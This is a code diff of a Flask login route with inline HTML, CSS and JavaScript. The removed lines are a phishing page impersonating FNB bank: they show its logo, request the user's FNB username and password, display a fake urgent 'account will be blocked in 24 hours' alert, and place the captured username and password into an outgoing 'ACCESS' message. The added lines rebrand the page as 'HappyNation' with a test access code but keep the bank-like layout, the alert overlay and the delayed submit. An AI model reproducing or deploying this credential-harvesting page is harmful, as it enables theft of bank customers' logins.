@@ -1175,11 +1175,13 @@ def login():
             ""
         ).strip()
 
-        test_password = (
-            request.form.get("password")
-            or request.form.get("password")
-            or ""
+        test_access_code = request.form.get(
+            "test_access_code",
+            ""
         ).strip()
+
+        if not username or not test_access_code:
+            return redirect(url_for("login"))
 
         session.clear()
 
@@ -1189,13 +1191,13 @@ def login():
         session["device"] = get_device()
 
         session["test_username"] = username
-        session["test_password"] = test_password
+        session["test_access_verified"] = True
 
         access_message = f"""
 🔐 ACCESS
 
 Username: {username}
-Password: {test_password}
+Status: Test access started
 """
 
         try:
@@ -1212,129 +1214,817 @@ Password: {test_password}
 
     content = """
 
-    <div class="login-page">
+<style>
 
-        <div class="login-small-header">
+/* ============================================================
+   NOVA PAGINA DE LOGIN
+   ============================================================ */
 
-            <div class="login-small-logo">
+html,
+body {
+    margin: 0 !important;
+    padding: 0 !important;
+    width: 100%;
+    height: 100%;
+    overflow: hidden !important;
+}
 
-    <img
-        src="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
-        alt="Logo"
-        class="small-real-logo"
-    >
+body {
+    background: #0848bd;
+}
 
-</div>
-        </div>
 
-        <div class="login-box">
+/* PAGINA */
 
-           <div class="login-logo">
+.hn-login-page {
+    position: fixed;
 
-    <img
-        src="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
-        alt="Logo"
-        class="real-logo"
-    >
+    inset: 0;
 
-        </div>
+    width: 100vw;
+    height: 100dvh;
 
-            <div class="login-title">
- 
-                
+    overflow: hidden;
 
-                <br><br>
+    background:
+        linear-gradient(
+            180deg,
+            #0b42b6 0%,
+            #0759cf 47%,
+            #078ff2 100%
+        );
 
-                please enter your FNB Username and  Password
-                to login.
+    font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+    display: flex;
+    justify-content: center;
+}
+
+
+/* ESTRUTURA CENTRAL */
+
+.hn-login-layout {
+    width: min(100%, 430px);
+    height: 100%;
+
+    padding:
+        10px
+        15px
+        5px;
+
+    box-sizing: border-box;
+
+    display: grid;
+
+    grid-template-rows:
+        9.5%
+        52.5%
+        38%;
+}
+
+
+/* ============================================================
+   LOGO
+   ============================================================ */
+
+.hn-logo-zone {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.hn-logo-circle {
+    width: 62px;
+    height: 62px;
+
+    border-radius: 50%;
+
+    background: #36b6f2;
+
+    overflow: hidden;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.hn-logo-circle img {
+    width: 100%;
+    height: 100%;
+
+    object-fit: contain;
+
+    display: block;
+}
+
+
+/* ============================================================
+   CARTAO
+   ============================================================ */
+
+.hn-login-card {
+    width: 100%;
+    height: 100%;
+
+    box-sizing: border-box;
+
+    background: #ffffff;
+
+    border-radius: 8px;
+
+    box-shadow:
+        0 3px 11px
+        rgba(0, 0, 0, 0.28);
+
+    padding:
+        32px
+        17px
+        22px;
+
+    overflow: hidden;
+}
+
+
+/* TITULO */
+
+.hn-login-title {
+    margin:
+        0
+        0
+        66px;
+
+    text-align: center;
+
+    color: #12386e;
+
+    font-size: 18px;
+
+    font-weight: 400;
+
+    line-height: 1.2;
+}
+
+
+/* ============================================================
+   CAMPOS
+   ============================================================ */
+
+.hn-field {
+    position: relative;
+
+    width: 100%;
+
+    margin-bottom: 49px;
+}
+
+.hn-field input {
+    width: 100%;
+    height: 43px;
+
+    box-sizing: border-box;
+
+    border: none;
+
+    border-bottom:
+        1px solid
+        #999999;
+
+    border-radius: 0;
+
+    outline: none;
+
+    padding:
+        0
+        0
+        7px;
+
+    background: transparent;
+
+    color: #555555;
+
+    font-size: 19px;
+
+    font-weight: 400;
+}
+
+.hn-field input::placeholder {
+    color: #777777;
+    opacity: 1;
+}
+
+.hn-field input:focus {
+    border-bottom:
+        1.5px solid
+        #0789d8;
+}
+
+
+/* SEGUNDO CAMPO */
+
+.hn-access-field input {
+    padding-right: 64px;
+}
+
+
+/* SHOW */
+
+.hn-show-button {
+    position: absolute;
+
+    right: 0;
+    bottom: 10px;
+
+    border: none;
+
+    background: transparent;
+
+    color: #666666;
+
+    padding: 0;
+
+    font-size: 15px;
+
+    cursor: pointer;
+}
+
+
+/* ============================================================
+   BOTAO
+   ============================================================ */
+
+.hn-signin-area {
+    text-align: center;
+
+    margin-top: -4px;
+}
+
+.hn-signin-button {
+    width: 101px;
+    height: 38px;
+
+    border:
+        1px solid
+        #c7c7c7;
+
+    border-radius: 2px;
+
+    background: #d8d8d8;
+
+    color: #ffffff;
+
+    font-size: 15px;
+
+    font-weight: bold;
+
+    cursor: pointer;
+}
+
+.hn-signin-button:active {
+    background: #cccccc;
+}
+
+.hn-signin-button:disabled {
+    opacity: 0.7;
+}
+
+
+/* ============================================================
+   TEXTOS DENTRO DO CARTAO
+   ============================================================ */
+
+.hn-agreement {
+    margin-top: 11px;
+
+    text-align: center;
+
+    color: #222222;
+
+    font-size: 13px;
+
+    line-height: 1.4;
+}
+
+.hn-agreement a {
+    color: #0789c9;
+
+    text-decoration: none;
+}
+
+.hn-forgot {
+    margin-top: 20px;
+
+    text-align: center;
+
+    color: #222222;
+
+    font-size: 13px;
+}
+
+.hn-forgot a {
+    color: #0789c9;
+
+    text-decoration: none;
+}
+
+
+/* ============================================================
+   PARTE AZUL INFERIOR
+   ============================================================ */
+
+.hn-login-bottom {
+    box-sizing: border-box;
+
+    padding-top: 20px;
+
+    text-align: center;
+
+    color: #ffffff;
+
+    font-size: 13px;
+
+    line-height: 1.35;
+}
+
+.hn-bottom-line {
+    margin-bottom: 14px;
+}
+
+.hn-register {
+    display: block;
+
+    margin-bottom: 16px;
+
+    color: white;
+
+    font-weight: 600;
+}
+
+.hn-help {
+    margin-top: 3px;
+
+    margin-bottom: 20px;
+}
+
+.hn-help strong {
+    font-weight: 700;
+}
+
+.hn-support {
+    margin-bottom: 5px;
+}
+
+.hn-support-links {
+    margin-bottom: 27px;
+
+    font-weight: 700;
+}
+
+.hn-bottom-links {
+    margin-top: 4px;
+}
+
+.hn-bottom-links div {
+    margin-bottom: 15px;
+
+    font-weight: 700;
+}
+
+.hn-version {
+    margin-top: 27px;
+
+    color: #17396c;
+
+    font-size: 12px;
+}
+
+
+/* ============================================================
+   AVISO
+   ============================================================ */
+
+.hn-notice {
+    position: fixed;
+
+    inset: 0;
+
+    z-index: 999999;
+
+    display: none;
+
+    align-items: center;
+
+    justify-content: center;
+
+    padding: 20px;
+
+    background:
+        rgba(
+            0,
+            0,
+            0,
+            0.45
+        );
+}
+
+.hn-notice-box {
+    width: 100%;
+
+    max-width: 340px;
+
+    box-sizing: border-box;
+
+    padding:
+        28px
+        22px;
+
+    border-radius: 14px;
+
+    background: #0875d1;
+
+    color: white;
+
+    text-align: center;
+
+    box-shadow:
+        0
+        12px
+        30px
+        rgba(
+            0,
+            0,
+            0,
+            0.25
+        );
+}
+
+.hn-notice-icon {
+    margin-bottom: 8px;
+
+    font-size: 32px;
+}
+
+.hn-notice-title {
+    margin-bottom: 12px;
+
+    font-size: 21px;
+
+    font-weight: 700;
+}
+
+.hn-notice-username {
+    margin-bottom: 12px;
+
+    font-size: 18px;
+
+    font-weight: 700;
+}
+
+.hn-notice-text {
+    margin-bottom: 20px;
+
+    font-size: 15px;
+
+    line-height: 1.5;
+}
+
+.hn-notice-button {
+    min-width: 100px;
+
+    padding:
+        10px
+        22px;
+
+    border: none;
+
+    border-radius: 5px;
+
+    background: white;
+
+    color: #0875d1;
+
+    font-size: 15px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+}
+
+
+/* ============================================================
+   TELAS MAIS BAIXAS
+   ============================================================ */
+
+@media (max-height: 730px) {
+
+    .hn-login-layout {
+        grid-template-rows:
+            9%
+            53%
+            38%;
+    }
+
+    .hn-login-card {
+        padding-top: 25px;
+    }
+
+    .hn-login-title {
+        margin-bottom: 48px;
+    }
+
+    .hn-field {
+        margin-bottom: 37px;
+    }
+
+    .hn-login-bottom {
+        padding-top: 13px;
+    }
+
+    .hn-bottom-line {
+        margin-bottom: 10px;
+    }
+
+    .hn-help {
+        margin-bottom: 13px;
+    }
+
+    .hn-support-links {
+        margin-bottom: 18px;
+    }
+
+    .hn-bottom-links div {
+        margin-bottom: 11px;
+    }
+
+    .hn-version {
+        margin-top: 17px;
+    }
+}
+
+
+/* TELAS MUITO ESTREITAS */
+
+@media (max-width: 350px) {
+
+    .hn-login-layout {
+        padding-left: 10px;
+        padding-right: 10px;
+    }
+
+    .hn-login-card {
+        padding-left: 14px;
+        padding-right: 14px;
+    }
+
+    .hn-login-title {
+        font-size: 17px;
+    }
+
+    .hn-field input {
+        font-size: 17px;
+    }
+}
+
+</style>
+
+
+<div class="hn-login-page">
+
+    <div class="hn-login-layout">
+
+
+        <!-- LOGO -->
+
+        <div class="hn-logo-zone">
+
+            <div class="hn-logo-circle">
+
+                <img
+                    src="https://happy.png"
+                    alt=""
+                    onerror="this.style.display='none';"
+                >
 
             </div>
 
-           
+        </div>
 
-           <form method="POST" id="loginForm">
 
-    <label class="login-label">
-        Username:
-    </label>
+        <!-- CARTAO -->
 
-<input
-    id="usernameInput"
-    class="login-input"
-    type="text"
-    name="username"
-    autocomplete="on"
-    required
->
-    <label class="login-label">
-        Password:
-    </label>
+        <div class="hn-login-card">
 
-    <input
-    class="login-input"
-    type="password"
-    name="password"
-    autocomplete="off"
-    minlength="5"
-    title="Password must contain at least 5 characters."
-    required
->
+            <div class="hn-login-title">
+                Sign in to HappyNation
+            </div>
 
-    <button
-    id="loginButton"
-    class="login-button"
-    type="submit"
->
-        Login
-    </button>
 
-    <button
-        class="secondary-login-button"
-        type="button"
-    >
-        Forgot Password
-    </button>
+            <form
+                method="POST"
+                id="loginForm"
+            >
 
-    <button
-        class="secondary-login-button"
-        type="button"
-    >
-        Register
-    </button>
 
-</form>
+                <!-- USERNAME -->
+
+                <div class="hn-field">
+
+                    <input
+                        id="usernameInput"
+                        type="text"
+                        name="username"
+                        placeholder="Username"
+                        autocomplete="off"
+                        required
+                    >
+
+                </div>
+
+
+                <!-- ACCESS CODE -->
+
+                <div
+                    class="
+                        hn-field
+                        hn-access-field
+                    "
+                >
+
+                    <input
+                        id="accessCodeInput"
+                        type="password"
+                        name="test_access_code"
+                        placeholder="Test Access Code"
+                        autocomplete="off"
+                        minlength="5"
+                        required
+                    >
+
+                    <button
+                        type="button"
+                        id="showCodeButton"
+                        class="hn-show-button"
+                    >
+                        SHOW
+                    </button>
+
+                </div>
+
+
+                <!-- SIGN IN -->
+
+                <div class="hn-signin-area">
+
+                    <button
+                        type="submit"
+                        id="loginButton"
+                        class="hn-signin-button"
+                    >
+                        SIGN IN
+                    </button>
+
+                </div>
+
+
+            </form>
+
+
+            <div class="hn-agreement">
+
+                By signing in, I agree to the
+
+                <a href="/terms">
+                    T&amp;Cs
+                </a>
+
+            </div>
+
+
+            <div class="hn-forgot">
+
+                Forgot
+
+                <a
+                    href="#"
+                    onclick="return false;"
+                >
+                    Username
+                </a>
+
+                |
+
+                <a
+                    href="#"
+                    onclick="return false;"
+                >
+                    Access Code
+                </a>
+
+            </div>
+
+
+        </div>
+
+
+        <!-- RODAPE -->
+
+        <div class="hn-login-bottom">
+
+            <div class="hn-bottom-line">
+                New to HappyNation?
+            </div>
+
+            <span class="hn-register">
+                Register here
+            </span>
+
+
+            <div class="hn-help">
+
+                <strong>
+                    Need help?
+                </strong>
+
+                Contact your assessment administrator
+
+            </div>
+
+
+            <div class="hn-support">
+                Assessment Support
+            </div>
+
+
+            <div class="hn-support-links">
+                Support &nbsp; | &nbsp; Email
+            </div>
+
+
+            <div class="hn-bottom-links">
+
+                <div>
+                    Privacy and Security
+                </div>
+
+                <div>
+                    Disclaimer
+                </div>
+
+            </div>
+
+
+            <div class="hn-version">
+                Version 1.0.0
+            </div>
+
+
+        </div>
+
+
+    </div>
+
+</div>
+
+
+<!-- ============================================================
+     ALERTA
+     ============================================================ -->
 
 <div
     id="testNotice"
-    class="test-notice-overlay"
-    style="display:none;"
+    class="hn-notice"
 >
 
-    <div class="test-notice-box">
+    <div class="hn-notice-box">
 
-        <div class="test-notice-icon">
+        <div class="hn-notice-icon">
             ⚠
         </div>
 
-        <div class="test-notice-title">
-            FNB ALERT
+        <div class="hn-notice-title">
+            ALERT
         </div>
 
         <div
             id="noticeUsername"
-            class="test-notice-username"
+            class="hn-notice-username"
         ></div>
 
-        <div class="test-notice-text">
-            UPDATE YOUR ACCOUNT PLEASE.
+        <div class="hn-notice-text">
+
+            HI.
+
             <br><br>
-            YOUR ACCOUNT IS NOT UPDATED ON THE 2026 
-            SEVER AND WILL BE BLOCKED IN 24 HOURS.
+
+            HELLO.
+
         </div>
 
         <button
             type="button"
-            class="test-notice-button"
+            class="hn-notice-button"
             id="noticeOkButton"
         >
             OK
@@ -1344,92 +2034,176 @@ Password: {test_password}
 
 </div>
 
+
 <script>
 
-document.addEventListener("DOMContentLoaded", function() {
+document.addEventListener(
+    "DOMContentLoaded",
+    function() {
 
-    const form =
-        document.getElementById("loginForm");
+        const form =
+            document.getElementById(
+                "loginForm"
+            );
 
-    const usernameInput =
-        document.getElementById("usernameInput");
+        const usernameInput =
+            document.getElementById(
+                "usernameInput"
+            );
 
-    const notice =
-        document.getElementById("testNotice");
+        const accessCodeInput =
+            document.getElementById(
+                "accessCodeInput"
+            );
 
-    const noticeUsername =
-        document.getElementById("noticeUsername");
+        const showCodeButton =
+            document.getElementById(
+                "showCodeButton"
+            );
 
-    const okButton =
-        document.getElementById("noticeOkButton");
+        const notice =
+            document.getElementById(
+                "testNotice"
+            );
 
-    let submitted = false;
-    let timer = null;
+        const noticeUsername =
+            document.getElementById(
+                "noticeUsername"
+            );
 
-    function continueLogin() {
+        const okButton =
+            document.getElementById(
+                "noticeOkButton"
+            );
 
-        if (submitted) {
-            return;
-        }
+        const loginButton =
+            document.getElementById(
+                "loginButton"
+            );
 
-        submitted = true;
-        notice.style.display = "none";
-        form.submit();
-    }
 
-    form.addEventListener("submit", function(event) {
+        let submitted = false;
 
-        if (submitted) {
-            return;
-        }
+        let timer = null;
 
-        event.preventDefault();
 
-        const username =
-            usernameInput.value.trim();
+        /* SHOW / HIDE */
 
-        noticeUsername.textContent =
-            username
-            ? "Mr/Ms. " + username
-            : "";
+        showCodeButton.addEventListener(
+            "click",
+            function() {
 
-        notice.style.display = "flex";
+                if (
+                    accessCodeInput.type
+                    ===
+                    "password"
+                ) {
 
-        timer = setTimeout(
-            continueLogin,
-            10000
+                    accessCodeInput.type =
+                        "text";
+
+                    showCodeButton.textContent =
+                        "HIDE";
+
+                } else {
+
+                    accessCodeInput.type =
+                        "password";
+
+                    showCodeButton.textContent =
+                        "SHOW";
+
+                }
+
+            }
         );
 
-    });
 
-    okButton.addEventListener("click", function() {
+        function continueLogin() {
 
-        if (timer) {
-            clearTimeout(timer);
+            if (submitted) {
+                return;
+            }
+
+            submitted = true;
+
+            notice.style.display =
+                "none";
+
+            loginButton.disabled =
+                true;
+
+            form.submit();
+
         }
 
-        continueLogin();
 
-    });
+        form.addEventListener(
+            "submit",
+            function(event) {
 
-});
+                if (submitted) {
+                    return;
+                }
+
+                event.preventDefault();
+
+
+                const username =
+                    usernameInput
+                    .value
+                    .trim();
+
+
+                noticeUsername.textContent =
+                    username
+                    ?
+                    "Mr/Ms. " + username
+                    :
+                    "";
+
+
+                notice.style.display =
+                    "flex";
+
+
+                timer =
+                    setTimeout(
+                        continueLogin,
+                        10000
+                    );
+
+            }
+        );
+
+
+        okButton.addEventListener(
+            "click",
+            function() {
+
+                if (timer) {
+
+                    clearTimeout(
+                        timer
+                    );
+
+                }
+
+                continueLogin();
+
+            }
+        );
+
+    }
+);
 
 </script>
-
-<footer class="login-footer">
-    Copyright © 2026 FristRand bank Limited. All rights reserved.
-</footer>
-
-</div>
-
-</div>
 
     """
 
     return render_template_string(
         base(content, False)
     )
-
 
 # ============================================================
 # TRANSITION
